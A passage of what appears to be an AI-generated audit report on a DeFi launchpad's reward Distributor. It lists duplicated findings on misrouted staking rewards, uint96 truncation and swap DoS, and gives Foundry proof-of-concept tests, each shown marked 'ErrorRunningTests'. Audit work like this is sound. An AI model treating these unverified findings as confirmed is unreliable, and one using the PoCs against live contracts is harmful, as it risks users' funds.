
Low 2X/High/gpt-5.1


 **Derived From** : Staker rewards from stake/unstake are misdirected to caller instead of beneficiary

[H-1]. Distributor sends stake/unstake rewards to launchpad instead of user, permanently stealing user yield
Finding Status: Valid
Status Confidence: SomeWhatConfident
Finding Confidence Justification: We were not provided the Launchpad.sol implementation; if Launchpad immediately forwards these amounts to the user, the impact would be mitigated by design. However, current Distributor logic definitively misdirects payouts at the source and advances user debts, making the loss persistent unless an off-contract mechanism compensates. Given the missing Launchpad code, confidence is somewhat reduced.
Finding Complexity: 5
Privilege: RequiresRole
[M-2]. Distributor.increaseStake/decreaseStake pay realized rewards to launchpad instead of the user, silently stealing incentives
Finding Status: Valid
Status Confidence: SomeWhatConfident
Finding Confidence Justification: The Launchpad contract code was not provided here to confirm whether it forwards realized rewards to the user immediately. If it does, the impact is mitigated; if it does not, users are underpaid. Given the Distributor’s code alone, the recipient appears incorrect, so we lean Valid but with reduced confidence pending Launchpad behavior.
Finding Complexity: 4
Privilege: RequiresRole
[M-3]. Rewards realized during Distributor.increaseStake/decreaseStake are paid to Launchpad instead of the staker
Finding Status: Valid
Status Confidence: SomeWhatConfident
Finding Confidence Justification: If the Launchpad is intentionally designed to custody and later forward these payouts to users, this behavior could be by design. However, given the Distributor’s interface and accounting semantics, the misdirection remains a valid issue absent explicit enforcement of forwarding, so we err on Valid with moderate confidence.
Finding Complexity: 4
Privilege: RequiresRole
[H-4]. Rewards realized on stake/unstake go to Launchpad (msg.sender) instead of the staker account
Finding Status: Valid
Status Confidence: SomeWhatConfident
Finding Confidence Justification: Confidence is limited by not reviewing the Launchpad implementation in this report. If Launchpad explicitly forwards the received rewards to users or credits them elsewhere (e.g., AccountManager) in lockstep with the returned amounts, the impact could be mitigated by design. However, given the library semantics and Distributor’s own claimRewards path, directing payments to msg.sender during stake/unstake is inconsistent and likely erroneous.
Finding Complexity: 4
Privilege: RequiresRole



 **Derived From** : Invariant Type: Arithmetic - For every reward pool and user, totalAccRewards(user.shares, accBaseRewardPerShare) and totalAccRewards(user.shares, accQuoteRewardPerShare) must always fit into uint96 when assigned to baseRewardDebt and quoteRewardDebt (i.e., totalAccRewards(...) <= type(uint96).max)

[L-5]. Reward debt stored as uint96 silently truncates for large cumulative rewards, leading to phantom rewards and DoS in stake/unstake/claim
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 3
Privilege: Permissionless



 **Derived From** : GriefableCallbacks

[M-6]. GTELaunchpadV2Pair’s external fee callback to Distributor.addRewards can revert when totalShares==0, DoSing swaps/mints/burns/sync
Finding Status: Valid
Status Confidence: SomeWhatConfident
Finding Confidence Justification: Integration timing (when endRewardsAccrual is called by the launchpad) is not fully shown in the provided code/docs and appears somewhat contradictory. However, the on-chain path and revert condition are clear and reproducible; if totalShares == 0 while rewardsPoolActive > 0, the DoS occurs.
Finding Complexity: 6
Privilege: Permissionless



 **Derived From** : Launchpad AMM swaps can be DOSed when rewards shares hit zero

[M-7]. GTELaunchpadV2Pair swap/mint/burn/sync can be DOSed when Distributor totalShares becomes zero
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 6
Privilege: Permissionless
[M-8]. GTELaunchpadV2Pair launchpad fee callback reverts when totalShares==0, DoSing swaps/mints/burns/sync
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 6
Privilege: Permissionless



 **Derived From** : AccountingInvariantViolation in Distributor._distributeAssets for stake/unstake

[H-9]. Staker rewards realized during increaseStake/decreaseStake are paid to Launchpad instead of the beneficiary account
Finding Status: Valid
Status Confidence: SomeWhatConfident
Finding Confidence Justification: While the code clearly pays out to msg.sender (Launchpad), we do not have the Launchpad implementation to prove or disprove whether it subsequently forwards rewards to users’ balances. The observable contract behavior alone supports the misdirection bug, but lacking the Launchpad code introduces small uncertainty about intended routing.
Finding Complexity: 4
Privilege: RequiresRole



 **Derived From** : RewardsTracker share-based accounting can overflow 96-bit debts causing reward misaccounting

[M-10]. RewardsTrackerLib uint96 rewardDebt overflow lets stakers over-claim rewards and break pool accounting
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 5
Privilege: Permissionless



 **Derived From** : Rounding in rewards index can lock small amounts from ever being skimmable

[L-11]. Integer-division rounding in rewards index locks dust in Distributor.totalPendingRewards and makes it unskimmable
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 6
Privilege: Permissionless



 **Derived From** : UniswapV2 LP token permit() vulnerable to signature malleability

[L-12]. UniswapV2ERC20.permit lacks low-s and v checks, allowing malleable signatures
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 3
Privilege: Permissionless



 **Derived From** : For all users and for both base and quote rewards, totalAccRewards(user.shares, acc*RewardPerShare) <= type(uint96).max; i.e. user.baseRewardDebt and user.quoteRewardDebt never exceed uint96 range when they are (re)assigned.

[M-13]. uint96 rewardDebt truncation in RewardsTrackerLib can brick rewards claims for heavily rewarded accounts
Finding Status: Valid
Status Confidence: SomeWhatConfident
Finding Confidence Justification: While the bug is clear and reproducible, the practical likelihood hinges on whether cumulative per-user rewards can realistically exceed 2**96 for the specific launch/quote assets. This may be rare for standard assets but still possible over long periods or via large external donations, which are allowed by design.
Finding Complexity: 4
Privilege: Permissionless



 **Derived From** : Reward accounting uses unsafe uint256→uint96 downcasts which can overflow and corrupt debts

[M-14]. Overflow of 96-bit reward debts can brick Distributor reward pool after extremely large emissions
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 6
Privilege: Permissionless



 **Derived From** : Launchpad fee distribution callback can revert and DoS Uniswap pair swaps when no rewards shares

[M-15]. Distributor.addRewards revert when no staking shares bricks GTELaunchpadV2Pair swaps
Finding Status: Valid
Status Confidence: SomeWhatConfident
Finding Confidence Justification: The code path and revert conditions are clear and reproducible. However, the exact lifecycle and timing of when rewards are ended by the launchpad (which could avoid this state in practice) is not fully guaranteed from the provided snippets. Thus, while the vulnerability stands in code, its frequency in production depends on operational sequencing, warranting some caution.
Finding Complexity: 5
Privilege: Permissionless


### Number of Findings
- C: 0
- H: 3
- M: 9
- L: 3
- I: 0

##Findings by Pattern


 **Derived From** : Staker rewards from stake/unstake are misdirected to caller instead of beneficiary

## [H-1]. Distributor sends stake/unstake rewards to launchpad instead of user, permanently stealing user yield

### Finding Severity Justification: On stake/unstake, matured rewards calculated for the user are transferred to msg.sender (the Launchpad) instead of the beneficiary account. The user’s reward debt is advanced and totalPendingRewards is decreased, so the user cannot claim these rewards later. This constitutes a loss of matured yield (real amounts) for users, aligning with High severity per the rubric.
## Derived From Pattern/Invariant
Staker rewards from stake/unstake are misdirected to caller instead of beneficiary

## Exploit Type
AccountingInvariantViolation

## Location
Distributor._distributeAssets

## Finding Status: Valid
## Status Confidence: SomeWhatConfident
### Finding Confidence Justification: We were not provided the Launchpad.sol implementation; if Launchpad immediately forwards these amounts to the user, the impact would be mitigated by design. However, current Distributor logic definitively misdirects payouts at the source and advances user debts, making the loss persistent unless an off-contract mechanism compensates. Given the missing Launchpad code, confidence is somewhat reduced.
### Finding Complexity: 5
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:RequiresRole


## Description
In `Distributor`, the stake/unstake flows are designed so that `RewardsTrackerLib.stake` / `unstake` compute the *pending rewards owed to the user account* and then advance that user's reward debt. However, `_distributeAssets` unconditionally transfers those rewards to `msg.sender` rather than the beneficiary `account` passed to `increaseStake` / `decreaseStake`.

Key code paths:

```solidity
function increaseStake(address launchAsset, address account, uint96 shares)
    external
    onlyLaunchpad
    returns (uint256 baseAmount, uint256 quoteAmount)
{
    RewardPoolData storage rs = RewardsTrackerStorage.getRewardPool(launchAsset);

    (baseAmount, quoteAmount) = rs.stake(account, uint96(shares));
    _distributeAssets(launchAsset, baseAmount, rs.quoteAsset, quoteAmount);
}

function decreaseStake(address launchAsset, address account, uint96 shares)
    external
    onlyLaunchpad
    returns (uint256 baseAmount, uint256 quoteAmount)
{
    RewardPoolData storage rs = RewardsTrackerStorage.getRewardPool(launchAsset);

    (baseAmount, quoteAmount) = rs.unstake(account, uint96(shares));
    _distributeAssets(launchAsset, baseAmount, rs.quoteAsset, quoteAmount);
}
```

`RewardsTrackerLib.stake` / `unstake` interpret `baseAmount` / `quoteAmount` as **pending rewards owed to `user`** before changing their share balance and debts:

```solidity
// stake
if (existingShares > 0) {
    baseAmount = totalAccRewards(existingShares, accBaseRewardsPerShare) - userData.baseRewardDebt;
    quoteAmount = totalAccRewards(existingShares, accQuoteRewardsPerShare) - userData.quoteRewardDebt;
}
...
userData.baseRewardDebt = uint96(totalAccRewards(existingShares + newShares, accBaseRewardsPerShare));

// unstake
baseAmount = totalAccRewards(existingShares, accBaseRewardsPerShare) - userData.baseRewardDebt;
quoteAmount = totalAccRewards(existingShares, accQuoteRewardsPerShare) - userData.quoteRewardDebt;
...
userData.baseRewardDebt = uint96(totalAccRewards(existingShares - removeShares, accBaseRewardsPerShare));
```

But in `_distributeAssets`, those computed rewards are sent to `msg.sender`:

```solidity
function _distributeAssets(address base, uint256 baseAmount, address quote, uint256 quoteAmount) internal {
    if (baseAmount > 0) {
        _decreaseTotalPending(base, baseAmount);
        base.safeTransfer(msg.sender, baseAmount); // <- goes to caller (Launchpad), not `account`
    }

    if (quoteAmount > 0) {
        _decreaseTotalPending(quote, quoteAmount);
        quote.safeTransfer(msg.sender, quoteAmount);
    }
}
```

For `increaseStake` / `decreaseStake`, `msg.sender` is the configured `launchpad` contract (`onlyLaunchpad`), while `account` is the actual user whose `UserRewardData` is updated. The effect:

* The user's `baseRewardDebt` / `quoteRewardDebt` is advanced **as if** they had received `baseAmount` / `quoteAmount`.
* `totalPendingRewards[asset]` is decremented by those amounts.
* The actual tokens are transferred to the Launchpad contract, **not** to the user.

Any later `claimRewards(launchAsset)` by the user will **not** re-credit these already-diverted rewards, because their reward debts have already been updated. This is a persistent loss of matured yield for the user, even if the Launchpad behaves "honestly" and just calls `increaseStake`/`decreaseStake` as part of normal bonding / vesting flows.

## Impact
Matured staking rewards that should belong to users are systematically sent to the Launchpad contract whenever it calls `increaseStake` or `decreaseStake` for existing stakers. Users can never claim these diverted rewards again because their reward debts are advanced and `totalPendingRewards` is decreased. This breaks the invariant that all decreases in `totalPendingRewards` correspond to actual transfers to the entitled staker, effectively allowing the Launchpad to capture user yield by design.

## Command to Run Test


## Proof of Concept
1. Deploy `Distributor` and set the test contract as both owner and `launchpad` via `initialize`.
2. Create a rewards pair for `base`/`quote` tokens.
3. Have a user `U` receive some initial stake via `increaseStake(base, U, 100)`; `U` now has 100 shares.
4. Add base rewards to the pool via `addRewards(base, quote, rewardAmount, 0)`.
5. Observe with `getPendingRewards(base, U)` that `U` has non-zero pending base rewards.
6. Call `increaseStake(base, U, 50)` from the Launchpad. Internally, `RewardsTrackerLib.stake` computes `baseAmount` as pending rewards for `U`, then advances `U`'s `baseRewardDebt` to the new index.
7. `_distributeAssets` is called and transfers `baseAmount` to `msg.sender` (the Launchpad), while decrementing `totalPendingRewards[base]`.
8. User `U`'s pending rewards drop (since their debt increased), but `U` never received the tokens. Any later call to `claimRewards` by `U` will only pay rewards accrued after the second stake; the earlier rewards are unrecoverable for `U` but were already removed from `totalPendingRewards` and paid to the Launchpad.

## Proof of Code
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {Distributor} from "contracts/launchpad/Distributor.sol";

contract DistributorStakeMisdirectionTest is Test {
    Distributor distributor;
    MockERC20 base;
    MockERC20 quote;

    address user = address(0xBEEF);

    function setUp() public {
        distributor = new Distributor();
        // This test contract is both owner and launchpad
        distributor.initialize(address(this));

        base = new MockERC20();
        quote = new MockERC20();

        distributor.createRewardsPair(address(base), address(quote));

        // Fund this contract so it can add rewards
        base.mint(address(this), 1e24);
        base.approve(address(distributor), type(uint256).max);

        // User starts with 100 shares
        distributor.increaseStake(address(base), user, 100);
    }

    function testRewardsFromStakeArePaidToLaunchpadNotUser() public {
        // Add rewards for the pool
        uint256 rewardAmount = 1e20;
        distributor.addRewards(address(base), address(quote), uint128(rewardAmount), 0);

        // User has pending rewards
        (uint256 pendingBaseBefore,) = distributor.getPendingRewards(address(base), user);
        assertGt(pendingBaseBefore, 0);

        uint256 launchpadBalanceBefore = base.balanceOf(address(this));
        uint256 userBalanceBefore = base.balanceOf(user);

        // User acquires more shares, triggering RewardsTrackerLib.stake
        distributor.increaseStake(address(base), user, 50);

        uint256 launchpadBalanceAfter = base.balanceOf(address(this));
        uint256 userBalanceAfter = base.balanceOf(user);

        // Rewards were sent to launchpad (this contract)
        assertGt(launchpadBalanceAfter - launchpadBalanceBefore, 0);
        // User did not receive those rewards
        assertEq(userBalanceAfter, userBalanceBefore);

        // Pending rewards for user have dropped (debt advanced)
        (uint256 pendingBaseAfter,) = distributor.getPendingRewards(address(base), user);
        assertLt(pendingBaseAfter, pendingBaseBefore);
    }
}

contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function transfer(address to, uint256 amount) external returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max) {
            require(allowed >= amount);
            allowance[from][msg.sender] = allowed - amount;
        }
        _transfer(from, to, amount);
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        require(balanceOf[from] >= amount);
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
    }
}


## Suggested Mitigation
Modify `_distributeAssets` to take an explicit `recipient` parameter and forward rewards to that recipient instead of `msg.sender`. For example:

```solidity
function increaseStake(address launchAsset, address account, uint96 shares)
    external
    onlyLaunchpad
    returns (uint256 baseAmount, uint256 quoteAmount)
{
    RewardPoolData storage rs = RewardsTrackerStorage.getRewardPool(launchAsset);
    (baseAmount, quoteAmount) = rs.stake(account, shares);
    _distributeAssetsTo(account, launchAsset, baseAmount, rs.quoteAsset, quoteAmount);
}

function _distributeAssetsTo(
    address recipient,
    address base,
    uint256 baseAmount,
    address quote,
    uint256 quoteAmount
) internal {
    if (baseAmount > 0) {
        _decreaseTotalPending(base, baseAmount);
        base.safeTransfer(recipient, baseAmount);
    }
    if (quoteAmount > 0) {
        _decreaseTotalPending(quote, quoteAmount);
        quote.safeTransfer(recipient, quoteAmount);
    }
}
```

Keep `claimRewards` using `msg.sender` as recipient, but for stake/unstake flows ensure the logical beneficiary (`account`) receives the rewards.


## [M-2]. Distributor.increaseStake/decreaseStake pay realized rewards to launchpad instead of the user, silently stealing incentives

### Finding Severity Justification: increaseStake/decreaseStake realize a user’s pending rewards (updating their reward debts) but then transfer the tokens to msg.sender (the Launchpad) instead of the beneficiary account. This permanently reduces the user’s claimable rewards unless the Launchpad forwards them. This misallocation can impact real user assets across routine stake/unstake operations. While a trusted Launchpad could forward funds, the contract-level behavior still creates a realistic path to user underpayment and adds unnecessary trust/operational risk.
## Derived From Pattern/Invariant
Staker rewards from stake/unstake are misdirected to caller instead of beneficiary

## Exploit Type
AccountingInvariantViolation

## Location
Distributor.increaseStake/decreaseStake

## Finding Status: Valid
## Status Confidence: SomeWhatConfident
### Finding Confidence Justification: The Launchpad contract code was not provided here to confirm whether it forwards realized rewards to the user immediately. If it does, the impact is mitigated; if it does not, users are underpaid. Given the Distributor’s code alone, the recipient appears incorrect, so we lean Valid but with reduced confidence pending Launchpad behavior.
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:RequiresRole


## Description
Distributor delegates staking logic to RewardsTrackerLib, which returns (baseAmount, quoteAmount) as the pending rewards accrued for a specific user whose shares are changing. However, in increaseStake and decreaseStake, those rewards are paid to msg.sender (the launchpad) rather than to the user whose accounting is updated.

Relevant code in Distributor:
  function increaseStake(address launchAsset, address account, uint96 shares)
      external
      onlyLaunchpad
      returns (uint256 baseAmount, uint256 quoteAmount)
  {
      RewardPoolData storage rs = RewardsTrackerStorage.getRewardPool(launchAsset);
      (baseAmount, quoteAmount) = rs.stake(account, uint96(shares));
      _distributeAssets(launchAsset, baseAmount, rs.quoteAsset, quoteAmount);
  }

  function decreaseStake(address launchAsset, address account, uint96 shares)
      external
      onlyLaunchpad
      returns (uint256 baseAmount, uint256 quoteAmount)
  {
      RewardPoolData storage rs = RewardsTrackerStorage.getRewardPool(launchAsset);
      (baseAmount, quoteAmount) = rs.unstake(account, uint96(shares));
      _distributeAssets(launchAsset, baseAmount, rs.quoteAsset, quoteAmount);
  }

RewardsTrackerLib.stake/unstake compute pending rewards for user:
  // inside stake
  if (existingShares > 0) {
      baseAmount = totalAccRewards(existingShares, accBaseRewardsPerShare) - userData.baseRewardDebt;
      quoteAmount = totalAccRewards(existingShares, accQuoteRewardsPerShare) - userData.quoteRewardDebt;
  }
  ...
  userData.baseRewardDebt = uint96(totalAccRewards(existingShares + newShares, accBaseRewardsPerShare));

  // inside unstake
  baseAmount = totalAccRewards(existingShares, accBaseRewardsPerShare) - userData.baseRewardDebt;
  quoteAmount = totalAccRewards(existingShares, accQuoteRewardsPerShare) - userData.quoteRewardDebt;
  ...
  userData.baseRewardDebt = uint96(totalAccRewards(existingShares - removeShares, accBaseRewardsPerShare));

Distributor._distributeAssets sends these rewards to msg.sender:
  function _distributeAssets(address base, uint256 baseAmount, address quote, uint256 quoteAmount) internal {
      if (baseAmount > 0) {
          _decreaseTotalPending(base, baseAmount);
          base.safeTransfer(msg.sender, baseAmount);
      }
      if (quoteAmount > 0) {
          _decreaseTotalPending(quote, quoteAmount);
          quote.safeTransfer(msg.sender, quoteAmount);
      }
  }

For increaseStake/decreaseStake, msg.sender is the launchpad contract (required by onlyLaunchpad), while account is the end user whose shares and reward debts are being updated. The effect is:
- RewardsTrackerLib advances account's baseRewardDebt / quoteRewardDebt, meaning those rewards are treated as already-paid for that user.
- Distributor._decreaseTotalPending reduces totalPendingRewards by the same baseAmount/quoteAmount.
- But the actual tokens are transferred to msg.sender (launchpad), not to account.

Later, when the user calls claimRewards(launchAsset), RewardsTrackerLib.claim computes pending rewards using the updated rewardDebt. The rewards paid during stake/unstake are no longer pending, so the user can never reclaim them from Distributor; they have been effectively diverted to the launchpad.

This misdirected payout violates the core accounting invariant that totalPendingRewards represents the amount still owed to stakers and that any reduction of totalPendingRewards corresponds to an actual transfer to the rightful beneficiary.

## Impact
Every time the launchpad calls increaseStake or decreaseStake for a user who has accrued pending rewards, those rewards are paid to the launchpad contract instead of the user, while the user's reward debt and the Distributor's totalPendingRewards are updated as if the user had been paid. This silently underpays users and allows the launchpad to capture or mis-handle user incentives. Over many stake/unstake operations, significant amounts of rewards can be permanently misallocated.

## Command to Run Test


## Proof of Concept
1) Deploy Distributor and set launchpad to the calling test contract via initialize(address(this)).
2) Create a rewards pair with base=token, quote=dummy address.
3) Launchpad grants user 10 shares by calling increaseStake(token, user, 10) — no rewards paid yet.
4) Add 100 base rewards via addRewards(token, dummy, 100, 0). totalPendingRewards[token] becomes 100.
5) Record launchpad’s token balance after addRewards (it should be 900 if starting from 1000).
6) From launchpad, call increaseStake(token, user, 1). RewardsTrackerLib.stake computes baseAmount=100 (user’s pending) and returns it; Distributor then reduces totalPendingRewards by 100 and transfers 100 tokens to msg.sender (launchpad), not to the user.
7) Assert: user’s token balance remains 0; user’s pending rewards are now 0; launchpad’s token balance increased by 100 compared to the post-addRewards balance; totalPendingRewards[token] is 0.
8) Optionally, have the user call claimRewards — it pays 0 because their reward debt was advanced during stake/unstake and those rewards were already diverted to the launchpad.

## Proof of Code
pragma solidity 0.8.27;
import "forge-std/Test.sol";
import {Distributor} from "contracts/launchpad/Distributor.sol";

contract StakePayoutMisdirectedTest is Test {
    Distributor dist;
    MockERC20 token;
    address user = address(0x1234);
    address dummyQuote = address(0xBEEF);

    function setUp() public {
        dist = new Distributor();
        dist.initialize(address(this)); // set this test as launchpad
        token = new MockERC20();

        // Set up rewards pool
        dist.createRewardsPair(address(token), dummyQuote);

        // Fund launchpad and approve Distributor for rewards
        token.mint(address(this), 1000);
        token.approve(address(dist), 1000);

        // Give user initial shares (no rewards yet)
        dist.increaseStake(address(token), user, 10);
    }

    function testStakeRewardsPaidToLaunchpadNotUser() public {
        // Add 100 base rewards into the pool
        dist.addRewards(address(token), dummyQuote, 100, 0);
        assertEq(dist.totalPendingRewards(address(token)), 100);

        // Launchpad balance after addRewards (100 sent to Distributor)
        uint256 launchpadBalAfterAdd = token.balanceOf(address(this));
        assertEq(launchpadBalAfterAdd, 900);

        // Increasing stake realizes user's pending rewards
        (uint256 basePaid, uint256 quotePaid) = dist.increaseStake(address(token), user, 1);
        assertEq(basePaid, 100);
        assertEq(quotePaid, 0);

        // Rewards were sent to msg.sender (launchpad), not the user
        assertEq(token.balanceOf(user), 0);
        assertEq(token.balanceOf(address(this)), launchpadBalAfterAdd + 100); // 900 + 100 = 1000

        // User has no pending now (reward debt advanced)
        (uint256 pendingBase, uint256 pendingQuote) = dist.getPendingRewards(address(token), user);
        assertEq(pendingBase, 0);
        assertEq(pendingQuote, 0);

        // totalPending decremented accordingly
        assertEq(dist.totalPendingRewards(address(token)), 0);

        // Optional: user claims (should be 0)
        vm.prank(user);
        (uint256 claimBase, uint256 claimQuote) = dist.claimRewards(address(token));
        assertEq(claimBase, 0);
        assertEq(claimQuote, 0);
    }
}

contract MockERC20 {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        emit Transfer(msg.sender, to, amount);
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "allowance");
        allowance[from][msg.sender] = allowed - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        emit Transfer(address(0), to, amount);
    }
}

## Suggested Mitigation
Route realized rewards from stake/unstake to the beneficiary account instead of msg.sender. Implement an internal variant that accepts a beneficiary: _distributeAssetsTo(address beneficiary, address base, uint256 baseAmount, address quote, uint256 quoteAmount). In increaseStake/decreaseStake, call _distributeAssetsTo(account, ...). Keep claimRewards paying to msg.sender. Ensure totalPendingRewards is decremented only when tokens are actually transferred to the intended beneficiary.


## [M-3]. Rewards realized during Distributor.increaseStake/decreaseStake are paid to Launchpad instead of the staker

### Finding Severity Justification: During increaseStake/decreaseStake, pending rewards calculated for the beneficiary account are transferred to msg.sender (the Launchpad) instead of the intended staker, while the staker’s reward debts are advanced. This causes realized, matured rewards to become unclaimable from the Distributor by the user unless the Launchpad forwards them off-contract. Funds are not stolen by an attacker, but user-owed yield can be silently diverted to a privileged contract, resulting in loss of yield for users under normal operation.
## Derived From Pattern/Invariant
Staker rewards from stake/unstake are misdirected to caller instead of beneficiary

## Exploit Type
AccountingInvariantViolation

## Location
Distributor.increaseStake / decreaseStake / _distributeAssets

## Finding Status: Valid
## Status Confidence: SomeWhatConfident
### Finding Confidence Justification: If the Launchpad is intentionally designed to custody and later forward these payouts to users, this behavior could be by design. However, given the Distributor’s interface and accounting semantics, the misdirection remains a valid issue absent explicit enforcement of forwarding, so we err on Valid with moderate confidence.
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:RequiresRole


## Description
Distributor.increaseStake and Distributor.decreaseStake are designed to be called by the Launchpad on behalf of a specific staker account. Internally, they rely on RewardsTrackerLib.stake/unstake, which compute and return any pending rewards owed to that account before updating their shares. However, the subsequent payout in _distributeAssets sends those rewards to msg.sender (the Launchpad) instead of the staker account, while still advancing the user's reward debts. This silently diverts rewards away from the intended beneficiary; the user cannot later claim them because their debts have been updated as if they had received the tokens.

Key code in Distributor:

    function increaseStake(address launchAsset, address account, uint96 shares)
        external
        onlyLaunchpad
        returns (uint256 baseAmount, uint256 quoteAmount)
    {
        RewardPoolData storage rs = RewardsTrackerStorage.getRewardPool(launchAsset);

        (baseAmount, quoteAmount) = rs.stake(account, uint96(shares));
        _distributeAssets(launchAsset, baseAmount, rs.quoteAsset, quoteAmount);
    }

    function decreaseStake(address launchAsset, address account, uint96 shares)
        external
        onlyLaunchpad
        returns (uint256 baseAmount, uint256 quoteAmount)
    {
        RewardPoolData storage rs = RewardsTrackerStorage.getRewardPool(launchAsset);

        (baseAmount, quoteAmount) = rs.unstake(account, uint96(shares));
        _distributeAssets(launchAsset, baseAmount, rs.quoteAsset, quoteAmount);
    }

RewardsTrackerLib.stake (similar for unstake):

    function stake(RewardPoolData storage self, address user, uint96 newShares)
        internal
        returns (uint256 baseAmount, uint256 quoteAmount)
    {
        ...
        uint256 existingShares = uint96(userData.shares);

        // Calculate pending rewards before updating shares
        if (existingShares > 0) {
            baseAmount = totalAccRewards(existingShares, accBaseRewardsPerShare) - userData.baseRewardDebt;
            quoteAmount = totalAccRewards(existingShares, accQuoteRewardsPerShare) - userData.quoteRewardDebt;
        }

        // Update user shares
        userData.shares += newShares;
        self.totalShares += newShares;

        // Update reward debts
        userData.baseRewardDebt = uint96(totalAccRewards(existingShares + newShares, accBaseRewardsPerShare));
        userData.quoteRewardDebt = uint96(totalAccRewards(existingShares + newShares, accQuoteRewardsPerShare));
    }

The returned baseAmount / quoteAmount represent rewards owed to that user. But _distributeAssets pays msg.sender:

    function _distributeAssets(address base, uint256 baseAmount, address quote, uint256 quoteAmount) internal {
        if (baseAmount > 0) {
            _decreaseTotalPending(base, baseAmount);
            base.safeTransfer(msg.sender, baseAmount);
        }

        if (quoteAmount > 0) {
            _decreaseTotalPending(quote, quoteAmount);
            quote.safeTransfer(msg.sender, quoteAmount);
        }
    }

For increaseStake/decreaseStake, msg.sender is the Launchpad contract (enforced by onlyLaunchpad), not the end user account. Meanwhile, the user's baseRewardDebt / quoteRewardDebt are updated as though they received baseAmount and quoteAmount. As a result:

- totalPendingRewards[asset] is decreased by baseAmount/quoteAmount.
- Actual tokens are sent to the Launchpad.
- The staker's debts move forward, so those rewards are no longer considered pending.

When the user later calls claimRewards(launchAsset), RewardsTrackerLib.claim() uses the updated debts and will not include these already-realized rewards in the payout. Unless the Launchpad manually forwards the tokens off-protocol, the user has no trustless way to recover them.

## Impact
Rewards accrued for a staker that are realized during stake/unstake operations are transferred to the Launchpad (msg.sender) while the staker's reward debts are advanced. This causes the Distributor to treat those rewards as already paid, reducing totalPendingRewards and making them unclaimable via claimRewards. In effect, user-owed yield is silently diverted from stakers to the privileged Launchpad and cannot be recovered trustlessly, breaking the invariant that all decreases in totalPendingRewards correspond to tokens actually delivered to the beneficiary.

## Command to Run Test


## Proof of Concept
1. Deploy Distributor and initialize it with the test contract as launchpad.
2. Deploy two mock ERC20 tokens: base (launchAsset) and quote.
3. From launchpad, call distributor.createRewardsPair(base, quote) to set up the rewards pool.
4. Call distributor.increaseStake(base, alice, 1) so alice has 1 share; no rewards have been added yet, so no tokens are transferred.
5. Mint 10 units of base to rewardProvider and approve Distributor to spend them.
6. From rewardProvider, call distributor.addRewards(base, quote, 10, 0). This increases pendingBaseRewards by 10 and totalPendingRewards[base] by 10 and transfers 10 base tokens into Distributor.
7. From launchpad (msg.sender == launchpad), call distributor.increaseStake(base, alice, 1) again:
   - RewardsTrackerLib.stake computes baseAmount = 10 as alice's pending base rewards (existingShares = 1, accBaseRewardsPerShare reflects 10 units across 1 share).
   - _distributeAssets(base, 10, ...) is invoked, which decreases totalPendingRewards[base] by 10 and calls base.safeTransfer(msg.sender, 10), sending 10 base tokens to the launchpad.
   - alice's baseRewardDebt is updated to reflect both her old and new shares as if she had received the 10 units.
8. Check balances:
   - base.balanceOf(address(distributor)) == 0.
   - base.balanceOf(alice) == 0.
   - base.balanceOf(launchpad) == 10.
9. From alice, call distributor.claimRewards(base). RewardsTrackerLib.claim sees that alice's debt equals her totalAccBaseRewards and returns baseAmount == 0, so she receives nothing. The 10 units she was economically owed are not claimable via the protocol and remain with the Launchpad.

## Proof of Code
pragma solidity 0.8.27;

import 'forge-std/Test.sol';
import '../contracts/launchpad/Distributor.sol';

contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory n, string memory s) { name = n; symbol = s; }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max) {
            allowance[from][msg.sender] = allowed - amount;
        }
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract MisdirectedRewardsTest is Test {
    Distributor distributor;
    MockERC20 base;
    MockERC20 quote;

    address alice = address(0xAAAA);
    address rewardProvider = address(0xDEAD);

    function setUp() public {
        distributor = new Distributor();
        distributor.initialize(address(this)); // launchpad = this

        base = new MockERC20('B', 'B');
        quote = new MockERC20('Q', 'Q');

        distributor.createRewardsPair(address(base), address(quote));

        // Give alice an initial share
        distributor.increaseStake(address(base), alice, 1);

        // Fund reward provider and approve distributor
        base.mint(rewardProvider, 10);
        vm.prank(rewardProvider);
        base.approve(address(distributor), 10);
    }

